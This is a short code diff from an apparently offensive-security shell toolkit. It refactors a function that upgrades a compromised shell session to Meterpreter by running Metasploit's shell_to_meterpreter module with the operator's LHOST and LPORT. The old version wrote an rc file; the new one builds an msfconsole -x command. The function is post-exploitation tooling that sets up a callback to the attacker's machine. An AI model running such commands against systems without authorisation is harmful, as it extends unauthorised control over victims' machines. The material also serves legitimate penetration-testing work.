@@ -276,19 +276,12 @@ nb-shell-handlers-msf-upgrade-shell() {
     nb-vars-set-lhost
     nb-vars-set-lport
 
-    echo "Use C-z to background shell and 'sessions' to list sessions"
-    echo "Use session <ID> to interact with session"
+    __info "Use C-z to background shell and 'sessions' to list sessions"
+    __info "Use 'session <ID>' to interact with session"
     echo
-    echo -n "Which session is it on?"
-    read __SESSION
+    __ask "Which session is it on?"
+    local se && __askvar se "SESSION"
 
-    rc_file="/tmp/msf_shell_upgrade.rc"
-
-    echo "use post/multi/manage/shell_to_meterpreter" > "$rc_file"
-    echo "set LHOST ${__LHOST}" >> "$rc_file"
-    echo "set SESSION ${__SESSION}" >> "$rc_file"
-    echo "set LPORT ${__LPORT}" >> "$rc_file"
-    echo "exploit" >> "$rc_file"
-
-    msfconsole -q -r "$rc_file"
+    local cmd="use post/multi/manage/shell_to_meterpreter; set LHOST ${__LHOST}; set SESSION ${se}; set LPORT ${__LPORT}; exploit"
+    print -z "msfconsole -n -q -x \" ${cmd} \""
 }
